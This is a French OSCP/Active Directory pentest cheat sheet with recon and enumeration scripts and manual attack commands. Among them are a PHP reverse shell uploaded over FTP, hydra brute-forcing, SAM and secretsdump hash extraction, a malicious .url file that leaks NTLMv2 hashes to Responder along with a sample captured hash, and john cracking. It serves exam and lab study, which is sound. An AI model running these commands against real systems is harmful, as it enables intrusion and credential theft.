# 🏅 OSCP Cheat Sheet

{% hint style="success" %}


Ce document regroupe tout ce que j’ai appris au travers des box et des cours de préparation aux techniques d’exploitation Active Directory. Il reflète mon expérience personnelle et n’engage que moi. Je ne couvre pas ici les techniques les plus avancées, mais vous pouvez vous tourner vers d’autres ressources comme [The Hacker Recipes](https://www.thehacker.recipes/) pour approfondir le sujet.
{% endhint %}

***

## **🛡️ Active Directory Cheat Sheet**

### 🔎**Recon Scans**

<details>

<summary>Port scanning and version scraping</summary>

```python
#!/usr/bin/env python3
import argparse
import subprocess
import os
import time
from datetime import datetime

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors de l'exécution: {e}")
        return None

def create_output_dir(base_dir="oscp_scans"):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = f"{base_dir}_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    return output_dir

def quick_scan(target, output_dir, scan_type="tcp"):
    print(f"\n[⚡] Début du scan {scan_type.upper()} rapide...")
    output_file = f"{output_dir}/initial_scan_{scan_type}.nmap"
    command = f"nmap -v -n -Pn -sS -T4 --max-retries 1 --min-rate 1000 -p- {target} -oN {output_file}"
    if scan_type == "udp":
        command = f"nmap -v -n -Pn -sU -T4 --max-retries 1 --min-rate 500 -p- {target} -oN {output_file}"
    
    run_command(command)
    return parse_open_ports(output_file)

def parse_open_ports(nmap_file):
    ports = []
    with open(nmap_file, 'r') as f:
        for line in f:
            if '/tcp' in line and 'open' in line:
                ports.append(line.split('/')[0])
            elif '/udp' in line and 'open' in line:
                ports.append(line.split('/')[0])
    return ','.join(ports)

def deep_scan(target, ports, output_dir, scan_type="tcp"):
    if not ports:
        return
    
    print(f"\n[🔍] Scan approfondi {scan_type.upper()} sur les ports: {ports}")
    output_file = f"{output_dir}/deep_scan_{scan_type}.nmap"
    command = f"nmap -v -n -Pn -sCV -T4 -p{ports} {target} -oN {output_file}"
    if scan_type == "udp":
        command = f"nmap -v -n -Pn -sU -sCV -T4 -p{ports} {target} -oN {output_file}"
    
    run_command(command)
    return output_file

def parse_versions(nmap_file, output_dir):
    print(f"\n[📄] Extraction des versions logicielles...")
    versions = []
    
    with open(nmap_file, 'r') as f:
        for line in f:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 4:
                    port_proto = parts[0]
                    service = parts[2]
                    version = ' '.join(parts[4:])
                    versions.append(f"{port_proto} - {service} {version}")
    
    version_file = f"{output_dir}/versions.txt"
    with open(version_file, 'w') as f:
        f.write("=== Versions logicielles détectées ===\n\n")
        f.write('\n'.join(versions))
    
    print(f"[✅] Versions sauvegardées dans: {version_file}")

def main():
    parser = argparse.ArgumentParser(description="OSCP Recon Scanner")
    parser.add_argument("target", help="Cible à scanner")
    parser.add_argument("-o", "--output", help="Répertoire de sortie")
    parser.add_argument("--udp", action="store_true", help="Activer le scan UDP")
    args = parser.parse_args()

    output_dir = args.output or create_output_dir()
    open_ports = {'tcp': '', 'udp': ''}

    # Scan TCP
    open_ports['tcp'] = quick_scan(args.target, output_dir, "tcp")
    deep_scan_file = deep_scan(args.target, open_ports['tcp'], output_dir, "tcp")
    
    # Scan UDP si activé
    if args.udp:
        open_ports['udp'] = quick_scan(args.target, output_dir, "udp")
        deep_scan_file = deep_scan(args.target, open_ports['udp'], output_dir, "udp")

    # Extraction des versions
    if deep_scan_file:
        parse_versions(deep_scan_file, output_dir)
    
    print(f"\n[🎉] Scan terminé! Résultats dans: {output_dir}")

if __name__ == "__main__":
    main()
```

</details>

<details>

<summary>AD scanning</summary>

```bash
#!/bin/bash
# AD Recon Script - Mode Assumed Breach (Optimisé et complet avec mises à jour)

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Vérification des dépendances
check_deps() {
    command -v nxc >/dev/null 2>&1 || { echo -e "${RED}[-] nxc non installé !${NC}"; exit 1; }
    command -v rpcclient >/dev/null 2>&1 || { echo -e "${RED}[-] rpcclient non installé !${NC}"; exit 1; }
}

# Création des répertoires de sauvegarde dans ad_recon
create_dirs() {
    mkdir -p ad_recon/{live_hosts,smb,ldap,mssql,winrm,rpcclient,kerberoast,asreproast}
}

# Mise à jour du fichier known_hosts
update_host_file() {
    # Recherche d'IP dans l'output
    ips=$(echo "$1" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
    for ip in $ips; do
        if [ ! -f ad_recon/known_hosts.txt ] || ! grep -q "$ip" ad_recon/known_hosts.txt; then
            echo "$ip" >> ad_recon/known_hosts.txt
            echo -e "${MAGENTA}[!!!] Nouveau host découvert: $ip. Mettez à jour le host file.${NC}"
        fi
    done
    # Recherche de domaines dans l'output (format domain:XYZ)
    domains=$(echo "$1" | grep -oE 'domain:[^ )]+' | cut -d':' -f2)
    for domain in $domains; do
        if [ ! -f ad_recon/known_hosts.txt ] || ! grep -q "$domain" ad_recon/known_hosts.txt; then
            echo "$domain" >> ad_recon/known_hosts.txt
            echo -e "${MAGENTA}[!!!] Nouveau domaine découvert: $domain. Mettez à jour le host file.${NC}"
        fi
    done
}

# Pause interactive
pause() {
    read -p "$(echo -e ${YELLOW}"[*] Continuer à l'étape suivante ? (Y/n):"${NC})" response
    [[ "$response" =~ ^[Nn]$ ]] && { echo -e "${RED}[-] Arrêt du script.${NC}"; exit 1; }
}

# Vérification des hôtes vivants (exemple avec ping)
live_hosts() {
    echo -e "\n${CYAN}[=== Vérification des hôtes vivants ===]${NC}"
    result=$(ping -c 1 "$IP" 2>&1)
    if [ -n "$result" ]; then
        echo "$result"
        echo -e "${GREEN}[+] Commande ping exécutée avec succès.${NC}"
        update_host_file "$result"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder la liste des hôtes vivants ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result" > ad_recon/live_hosts/live_hosts.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/live_hosts/live_hosts.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec de la vérification des hôtes vivants ou output nul.${NC}"
    fi
}

# Énumération SMB
smb_enum() {
    echo -e "\n${CYAN}[=== Énumération SMB ===]${NC}"
    result=$(nxc smb "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --shares 2>&1)
    if [ -n "$result" ]; then
        echo "$result"
        echo -e "${GREEN}[+] Commande SMB exécutée avec succès.${NC}"
        update_host_file "$result"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats SMB ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result" > ad_recon/smb/smb_enum.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/smb/smb_enum.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec de l'énumération SMB ou output nul.${NC}"
    fi
}

# Énumération LDAP
ldap_enum() {
    echo -e "\n${CYAN}[=== Énumération LDAP ===]${NC}"
    result=$(nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --users 2>&1)
    if [ -n "$result" ]; then
        echo "$result"
        echo -e "${GREEN}[+] Commande LDAP exécutée avec succès.${NC}"
        if echo "$result" | grep -qi "user"; then
            echo -e "${MAGENTA}[!!!] Liste d'utilisateurs détectée dans LDAP.${NC}"
        fi
        if echo "$result" | grep -iE "admin|local admin" >/dev/null; then
            echo -e "${MAGENTA}[!!!] Droit(s) d'admin détecté(s) dans LDAP.${NC}"
        fi
        update_host_file "$result"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats LDAP ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result" > ad_recon/ldap/ldap_enum.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/ldap/ldap_enum.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec de l'énumération LDAP ou output nul.${NC}"
    fi
}

# Énumération MSSQL
mssql_enum() {
    echo -e "\n${CYAN}[=== Énumération MSSQL ===]${NC}"
    result=$(nxc mssql "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" --query 'SELECT name FROM sys.databases' 2>&1)
    if [ -n "$result" ]; then
        echo "$result"
        echo -e "${GREEN}[+] Commande MSSQL exécutée avec succès.${NC}"
        update_host_file "$result"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats MSSQL ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result" > ad_recon/mssql/mssql_enum.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/mssql/mssql_enum.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec de l'énumération MSSQL ou output nul.${NC}"
    fi
}

# Vérifications WinRM
winrm_enum() {
    echo -e "\n${CYAN}[=== Vérifications WinRM ===]${NC}"
    result=$(nxc winrm "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -X whoami 2>&1)
    if [ -n "$result" ]; then
        echo "$result"
        echo -e "${GREEN}[+] Commande WinRM exécutée avec succès.${NC}"
        update_host_file "$result"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder la sortie WinRM ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result" > ad_recon/winrm/winrm_enum.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/winrm/winrm_enum.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec des vérifications WinRM ou output nul.${NC}"
    fi
}

# Énumération RPCClient (avec et sans credentials)
rpcclient_enum() {
    echo -e "\n${CYAN}[=== Énumération RPCClient (avec credentials) ===]${NC}"
    result=$(rpcclient -U "$USER%$PASSWORD" "$IP" -c "enumdomusers" 2>&1)
    if [ -n "$result" ]; then
        echo "$result"
        echo -e "${GREEN}[+] Commande rpcclient (avec creds) exécutée avec succès.${NC}"
        if echo "$result" | grep -qi "user"; then
            echo -e "${MAGENTA}[!!!] Liste d'utilisateurs trouvée via rpcclient (avec creds).${NC}"
        fi
        update_host_file "$result"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats rpcclient (avec creds) ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result" > ad_recon/rpcclient/rpcclient_enum_creds.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/rpcclient/rpcclient_enum_creds.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec de l'énumération rpcclient (avec creds) ou output nul.${NC}"
    fi

    echo -e "\n${CYAN}[=== Énumération RPCClient (sans credentials) ===]${NC}"
    result2=$(rpcclient -N "$IP" -c "enumdomusers" 2>&1)
    if [ -n "$result2" ]; then
        echo "$result2"
        echo -e "${GREEN}[+] Commande rpcclient (sans creds) exécutée avec succès.${NC}"
        if echo "$result2" | grep -qi "user"; then
            echo -e "${MAGENTA}[!!!] Liste d'utilisateurs trouvée via rpcclient (sans creds).${NC}"
        fi
        update_host_file "$result2"
        read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats rpcclient (sans creds) ? (Y/n):"${NC})" answer
        if [[ ! "$answer" =~ ^[Nn]$ ]]; then
            echo "$result2" > ad_recon/rpcclient/rpcclient_enum_nocreds.txt
            echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/rpcclient/rpcclient_enum_nocreds.txt.${NC}"
        fi
    else
        echo -e "${RED}[-] Échec de l'énumération rpcclient (sans creds) ou output nul.${NC}"
    fi
}

# Extraction et affichage de tous les usernames depuis preusers.txt
list_usernames() {
    echo -e "\n${CYAN}[=== Extraction des Usernames depuis preusers.txt ===]${NC}"
    if [ -f preusers.txt ]; then
        echo -e "${YELLOW}[***] Usernames détectés :${NC}"
        awk '/^SMB/ {
            if ($5=="[+]" || $5=="[*]") { print $6 } 
            else if($5 != "-Username-") { print $5 }
        }' preusers.txt | sort | uniq
    else
        echo -e "${RED}[-] Le fichier preusers.txt n'existe pas.${NC}"
    fi
}

# Scan Kerberoasting (avec nxc ldap et la bonne syntaxe)
kerberoast_scan() {
    echo -e "\n${CYAN}[=== Scan Kerberoasting ===]${NC}"
    tmp_file="temp_kerberoast.txt"
    nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoasting "$tmp_file" 2>&1
    if [ -f "$tmp_file" ]; then
        result=$(cat "$tmp_file")
        if [ -n "$result" ]; then
            echo "$result"
            echo -e "${GREEN}[+] Commande Kerberoasting exécutée avec succès.${NC}"
            update_host_file "$result"
            if echo "$result" | grep -qi "important"; then
                echo -e "${MAGENTA}[!!!] Information critique détectée dans Kerberoasting !${NC}"
            fi
            read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats Kerberoasting ? (Y/n):"${NC})" answer
            if [[ ! "$answer" =~ ^[Nn]$ ]]; then
                mv "$tmp_file" ad_recon/kerberoast/kerberoast_scan.txt
                echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/kerberoast/kerberoast_scan.txt.${NC}"
            else
                rm "$tmp_file"
            fi
        else
            echo -e "${RED}[-] Échec du scan Kerberoasting ou output nul.${NC}"
            rm "$tmp_file"
        fi
    else
        echo -e "${RED}[-] Échec du scan Kerberoasting ou fichier de sortie non généré.${NC}"
    fi
}

# Scan ASREProasting (avec nxc ldap et la bonne syntaxe)
asreproast_scan() {
    echo -e "\n${CYAN}[=== Scan ASREProasting ===]${NC}"
    tmp_file="temp_asreproast.txt"
    nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --asreproast "$tmp_file" 2>&1
    if [ -f "$tmp_file" ]; then
        result=$(cat "$tmp_file")
        if [ -n "$result" ]; then
            echo "$result"
            echo -e "${GREEN}[+] Commande ASREProasting exécutée avec succès.${NC}"
            update_host_file "$result"
            if echo "$result" | grep -qi "important"; then
                echo -e "${MAGENTA}[!!!] Information critique détectée dans ASREProasting !${NC}"
            fi
            read -p "$(echo -e ${YELLOW}"[*] Voulez-vous sauvegarder les résultats ASREProasting ? (Y/n):"${NC})" answer
            if [[ ! "$answer" =~ ^[Nn]$ ]]; then
                mv "$tmp_file" ad_recon/asreproast/asreproast_scan.txt
                echo -e "${GREEN}[+] Résultat sauvegardé dans ad_recon/asreproast/asreproast_scan.txt.${NC}"
            else
                rm "$tmp_file"
            fi
        else
            echo -e "${RED}[-] Échec du scan ASREProasting ou output nul.${NC}"
            rm "$tmp_file"
        fi
    else
        echo -e "${RED}[-] Échec du scan ASREProasting ou fichier de sortie non généré.${NC}"
    fi
}

# Rapport final : recherche étendue des points d'intérêt dans ad_recon
final_report() {
    echo -e "\n${GREEN}[+] Recon terminé !${NC}"
    echo -e "${YELLOW}[*] Points d'intérêt détectés dans les résultats :${NC}"
    grep -Ri 'admin\|pwned\|user\|exec' ad_recon || echo -e "${RED}[-] Aucun point d'intérêt détecté.${NC}"
}

# MAIN
if [ $# -ne 4 ]; then
    echo -e "${RED}[-] Usage: $0 <IP> <USER> <PASSWORD> <DOMAIN>${NC}"
    exit 1
fi

IP=$1
USER=$2
PASSWORD=$3
DOMAIN=$4

check_deps
create_dirs

live_hosts
pause

smb_enum
pause

ldap_enum
pause

mssql_enum
pause

winrm_enum
pause

rpcclient_enum
pause

# Extraction des usernames depuis preusers.txt
list_usernames
pause

# Scans complémentaires
kerberoast_scan
pause

asreproast_scan
pause

final_report
```

</details>

<details>

<summary>Common services (SNMP, HTTP, SMB, FTP, SSH, RDP, MYSQL, MSSQL, DNS, SMTP, POP3, IMAP)</summary>

```bash
#!/bin/bash

# Configuration
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
OUTPUT_DIR="Service_Scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

# Dictionnaire de services avec commandes associées
declare -A SERVICE_SCANS=(
    ["SNMP"]="snmp_scan"
    ["HTTP"]="http_scan"
    ["SMB"]="smb_scan"
    ["FTP"]="ftp_scan"
    ["SSH"]="ssh_scan"
    ["RDP"]="rdp_scan"
    ["MYSQL"]="mysql_scan"
    ["MSSQL"]="mssql_scan"
    ["DNS"]="dns_scan"
    ["SMTP"]="smtp_scan"
    ["POP3"]="pop3_scan"
    ["IMAP"]="imap_scan"
)

# Fonctions d'énumération par service
snmp_scan() {
    local ip=$1
    echo -e "\n${CYAN}[SNMP] Running scan on $ip${NC}"
    
    # Scan de communauté SNMP
    echo "=== SNMP COMMUNITIES ===" > $OUTPUT_DIR/SNMP.txt
    snmpwalk -v2c -c public $ip 2>/dev/null | tee -a $OUTPUT_DIR/SNMP.txt
    snmp-check -c public -v2c $ip >> $OUTPUT_DIR/SNMP.txt 2>&1
    
    # Recherche de mots-clés
    grep -E -i "version|community|string|vulnerable|Cisco|config" $OUTPUT_DIR/SNMP.txt | sort -u > $OUTPUT_DIR/SNMP_KEYWORDS.txt
}

http_scan() {
    local ip=$1
    echo -e "\n${CYAN}[HTTP] Running scan on $ip${NC}"
    
    # Scan de base
    nikto -h $ip -output $OUTPUT_DIR/HTTP_NIKTO.txt
    whatweb $ip --color=never > $OUTPUT_DIR/HTTP_WHATWEB.txt
    
    # Détection de CMS
    wget -qO- $ip | grep -E -i "wp-content|drupal|joomla|wordpress" >> $OUTPUT_DIR/HTTP_CMS.txt
}

smb_scan() {
    local ip=$1
    echo -e "\n${CYAN}[SMB] Running scan on $ip${NC}"
    
    netexec smb $ip --shares --users --groups --pass-pol > $OUTPUT_DIR/SMB_NETEXEC.txt
    enum4linux -a $ip >> $OUTPUT_DIR/SMB_ENUM4LINUX.txt 2>&1
    
    grep -E -i "READ|WRITE|VERSION|ADMIN|PASSWORD" $OUTPUT_DIR/SMB_*.txt > $OUTPUT_DIR/SMB_KEYWORDS.txt
}

# ... (autres scan à ajouter plus tard)

main() {
    echo -e "${GREEN}=== Service Enumeration Tool ===${NC}"
    read -p "Target IP/Host: " TARGET
    echo -e "${YELLOW}Available services: ${!SERVICE_SCANS[@]}${NC}"
    read -p "Enter services (comma-separated): " SERVICES
    
    IFS=',' read -ra SERVICE_LIST <<< "$SERVICES"
    
    for service in "${SERVICE_LIST[@]}"; do
        service=$(echo $service | xargs) # Nettoyage
        if [[ -n "${SERVICE_SCANS[$service]}" ]]; then
            ${SERVICE_SCANS[$service]} $TARGET
        else
            echo -e "${RED}[!] Service non supporté: $service${NC}"
        fi
    done
    
    generate_report
}

generate_report() {
    echo -e "\n${GREEN}=== Scan Report ===${NC}"
    echo -e "Target: $TARGET"
    echo -e "Services scannés: ${SERVICE_LIST[@]}"
    
    # Résumé des findings
    grep -EH -i "vulnerable|admin|password|version|CVE-" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/CRITICAL_FINDINGS.txt
    grep -H -i "user" $OUTPUT_DIR/*.txt > $OUTPUT_DIR/USER_FINDINGS.txt
    
    echo -e "\n${CYAN}[!] Points critiques (Vérifier CRITICAL_FINDINGS.txt):${NC}"
    cat $OUTPUT_DIR/CRITICAL_FINDINGS.txt | awk '!seen[$0]++'
    
    echo -e "\n${GREEN}[+] Scan complet. Résultats dans: $OUTPUT_DIR${NC}"
}

# Démarrage
main
```

</details>

<details>

<summary>Directory Discovery</summary>

```bash
#!/bin/bash

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Vérification des arguments
if [ $# -lt 2 ]; then
    echo -e "${RED}Usage: $0 [small|full] <IP> [PORT]${NC}"
    echo -e "${YELLOW}Exemples:"
    echo -e "  Mode light : $0 small 10.10.10.10"
    echo -e "  Mode complet: $0 full 10.10.10.10 8080${NC}"
    exit 1
fi

MODE=$1
IP=$2
PORT=${3:-80}
TARGET="http://$IP:$PORT"
SCAN_DIR="scan_directory/$IP"
RAW_DIR="$SCAN_DIR/raw"
RESULTS_DIR="$SCAN_DIR/results"

# Configuration des extensions
declare -A SCAN_EXTENSIONS
if [ "$MODE" == "small" ]; then
    SCAN_EXTENSIONS=(["php"]=1 ["txt"]=1 ["html"]=1)
    DIRB_EXT=".php,.txt,.html"
    GOBUSTER_EXT="php,txt,html"
elif [ "$MODE" == "full" ]; then
    SCAN_EXTENSIONS=(["php"]=1 ["txt"]=1 ["html"]=1 ["aspx"]=1 ["js"]=1 ["css"]=1)
    DIRB_EXT=".php,.txt,.html,.aspx,.js,.css"
    GOBUSTER_EXT="php,txt,html,aspx,js,css"
else
    echo -e "${RED}Mode invalide! Choisir 'small' ou 'full'${NC}"
    exit 1
fi

# Vérification des outils
check_tool() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}Erreur: $1 n'est pas installé${NC}"
        exit 1
    fi
}

for tool in nikto dirb gobuster feroxbuster; do
    check_tool $tool
done

# Création de l'arborescence
create_dirs() {
    mkdir -p "$RAW_DIR" "$RESULTS_DIR"
    rm -f "$RESULTS_DIR"/*.txt 2> /dev/null
}

# Fonction de scan générique
run_scan() {
    echo -e "\n${BLUE}[*] Lancement de $1...${NC}"
    eval "$2"
    if [ $? -ne 0 ]; then
        echo -e "${RED}Erreur lors de l'exécution de $1${NC}"
        exit 1
    fi
}

# Traitement des résultats
process_results() {
    local tool=$1
    local file=$2
    local pattern=$3
    
    grep -E "$pattern" "$file" | while read -r line; do
        path=$(echo "$line" | sed -n "s|$pattern|\1|p")
        code=$(echo "$line" | sed -n "s|$pattern|\2|p")
        
        if [[ "$code" =~ ^(200|301|302|307|401|403)$ ]]; then
            filename=$(basename "${path%%\?*}")
            ext="${filename##*.}"
            
            if [[ "$ext" == "$filename" ]]; then
                echo "$path" >> "$RESULTS_DIR/no_extension.txt"
            elif [[ -n "${SCAN_EXTENSIONS[$ext]}" ]]; then
                echo "$path" >> "$RESULTS_DIR/$ext.txt"
            else
                echo "$path" >> "$RESULTS_DIR/other.txt"
            fi
        fi
    done
}

# Nettoyage des résultats
clean_results() {
    for file in "$RESULTS_DIR"/*; do
        sort -u "$file" -o "$file"
        sed -i '/^$/d' "$file"
    done
}

# Main
create_dirs

echo -e "\n${GREEN}[+] Cible: ${YELLOW}$TARGET"
echo -e "${GREEN}[+] Mode de scan: ${YELLOW}$MODE${NC}"

# Nikto
run_scan "Nikto" "nikto -h $IP -p $PORT -Format txt -output $RAW_DIR/nikto.txt"

# Dirb
run_scan "Dirb" "dirb $TARGET/ /usr/share/dirb/wordlists/common.txt -X \"$DIRB_EXT\" -o $RAW_DIR/dirb.txt -r -z 10"

# Gobuster
run_scan "Gobuster" "gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -x $GOBUSTER_EXT -o $RAW_DIR/gobuster.txt"

# Feroxbuster
run_scan "Feroxbuster" "feroxbuster -u $TARGET -w /usr/share/wordlists/dirb/common.txt -x $GOBUSTER_EXT -o $RAW_DIR/feroxbuster.txt --silent"

# Analyse des résultats
echo -e "\n${BLUE}[*] Analyse des résultats...${NC}"

> "$RESULTS_DIR/all_paths.txt"

# Traitement Nikto
process_results "Nikto" "$RAW_DIR/nikto.txt" '^+ (.*): .*\((200|301|302|307|401|403)\)'

# Traitement Dirb
process_results "Dirb" "$RAW_DIR/dirb.txt" "^+ $TARGET(/[^ ]*) .*CODE:(200|301|302|307|401|403)"

# Traitement Gobuster
process_results "Gobuster" "$RAW_DIR/gobuster.txt" "(/[^ ]*) .*\(Status: (200|301|302|307|401|403)\)"

# Traitement Feroxbuster
process_results "Feroxbuster" "$RAW_DIR/feroxbuster.txt" "^[0-9]+.*[[:space:]](/[^ ]*) .* (200|301|302|307|401|403)"

# Finalisation
clean_results

echo -e "\n${GREEN}[+] Scan terminé ! Résultats dans: ${YELLOW}$RESULTS_DIR/${NC}"
echo -e "${BLUE}Fichiers générés:${NC}"
ls -l "$RESULTS_DIR" | awk '{printf "• %-15s %s\n", $9, $5}'
echo -e "\n${GREEN}Conseil OSCP:${NC} Vérifiez toujours manuellement les fichiers intéressants!"
```

</details>

<details>

<summary>Username Generator</summary>

```python
import argparse
import random
import unidecode

def generate_usernames(name, mode):
    first_name, last_name = name.split()
    first_name = unidecode.unidecode(first_name.lower())
    last_name = unidecode.unidecode(last_name.lower())
    
    usernames = set()
    
    if mode >= 1:
        usernames.add(f"{first_name[0]}{last_name}")  # jsmith
    
    if mode >= 2:
        usernames.update({
            f"{first_name}.{last_name}",  # john.smith
            f"{first_name[0]}.{last_name}",  # j.smith
            f"{last_name}{first_name[0]}",  # smithj
            f"{first_name}{last_name[0]}",  # johns
        })
    
    if mode >= 3:
        usernames.update({
            f"{first_name}{last_name}",  # johnsmith
            f"{first_name}{last_name}{random.randint(1,99)}",  # johnsmith42
            f"{first_name[0]}{last_name}{random.randint(1,99)}",  # jsmith87
            f"{first_name[:3]}{last_name[:4]}",  # johsmit
        })
    
    return usernames

def main():
    parser = argparse.ArgumentParser(description="Générateur d'identifiants utilisateurs")
    parser.add_argument("--mode", type=int, choices=[1, 2, 3], required=True, help="Niveau de complexité des identifiants (1, 2, ou 3)")
    parser.add_argument("--userlist", type=str, required=True, help="Fichier texte contenant la liste des utilisateurs (un par ligne)")
    parser.add_argument("--output", type=str, required=True, help="Fichier de sortie contenant uniquement les identifiants générés")
    args = parser.parse_args()
    
    try:
        with open(args.userlist, "r", encoding="utf-8") as file:
            users = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Erreur: fichier {args.userlist} introuvable.")
        return
    
    with open(args.output, "w", encoding="utf-8") as output_file:
        for user in users:
            usernames = generate_usernames(user, args.mode)
            for username in usernames:
                output_file.write(f"{username}\n")
    
    print(f"Identifiants générés enregistrés dans {args.output}")
    
if __name__ == "__main__":
    main()

```

</details>



## 📌 Reconnaissance & Énumération

First scan to do:

```sh
enum4linux <IP>
```

### 🔍 RPC Enumeration

#### **Manual Commands**

```sh
#anonymous login
rpcclient -N -U '' <IP> -c "enumdomusers" | grep -oP '(?<=user:\[)[^\]]+' > users.txt

srvinfo

#maybe user descriptions and other interesting stuff
querydispinfo
```

### 🔍 FTP Enumeration

#### **Manual Commands and exploitation**

<pre class="language-sh"><code class="lang-sh">#enumeration
nxc ftp &#x3C;IP> -u '' -p '' --ls
#try admin:admin credentials!!!

netexec ftp &#x3C;IP> -u '' -p '' --ls [DIRECTORY]

#Get Files
netexec ftp &#x3C;IP> -u ''-p '' --get ftp_flag.thm

#Reverse Shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
<strong>
</strong><strong>#modify IP and port and connect to FTP session
</strong>ftp &#x3C;target-ip>

# Upload the payload you downloaded and check listener
ftp> put shell.php

#download folders
lftp -u user,password ftp://adresse_du_serveur
mirror -c dossier_a_telecharger

--------
#bruteforce
sudo hydra -L users.txt -P '/wordlist' -s 21 ftp://$IP
</code></pre>

### 🔍 SMB Enumeration

#### **Manual Commands (netexec)**

<pre class="language-bash"><code class="lang-bash"># Enumerate SMB shares, users, sessions, and more (including anonymous auth)
netexec smb 192.168.56.175 -u '' -p '' --shares --users --rid-brute

# List accessible shares
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --shares | tee shares.txt

# Check for writable shares
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --spider-share '.*' --check-write | tee writable_shares.txt

#grep out usernames from --users output:
| grep -E "SMB\s+.*\s+[A-Za-z]+\.[A-Za-z]+" | awk '{print $5} > users.txt

#grep sam hive hashes
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam

#grep out hashes and usernames (check if you have others, not the best grep)
<strong>grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $1}' > secretsdumpusernames.txt
</strong>grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $4}' > secretsdumphashes.txt

</code></pre>

<details>

<summary>READ,WRITE Permissions</summary>

create a malicious url file:

```bash
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\<kali url>\%USERNAME%.icon
IconIndex=1
```

launch responder:

```
responder -I tun0 -wv
```

and on the smbclient instance:

```
smb: \> put shell.url 
```

After getting a git that should look like this:

```sh
[SMB] NTLMv2-SSP Client   : 192.168.212.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:1122334455667788:3E3707D87E6C52CBAD58B5B494F109A0:0101000000000000803B0EB9FE91DB0143226BF87B14A7A8000000000200080046005A005100310001001E00570049004E002D0057005600300050003300430044004D0032005A00560004003400570049004E002D0057005600300050003300430044004D0032005A0056002E0046005A00510031002E004C004F00430041004C000300140046005A00510031002E004C004F00430041004C000500140046005A00510031002E004C004F00430041004C0007000800803B0EB9FE91DB0106000400020000000800300030000000000000000100000000200000A26B564BC75A19D5CF9CFDC087083FCDDB4C8E97519F75A674E3DF5FA98AC4860A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100350038000000000000000000
```

you can crack  it with this command:

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash
```

</details>

### 🔍 LDAP Enumeration

#### **Manual Commands (netexec)**

```bash
# Enumerate LDAP users, groups, and policies (including anonymous if allowed)
netexec ldap 10.10.10.5 -u '' -p '' --users --groups --password-policy | tee ldap_enum_anon.txt
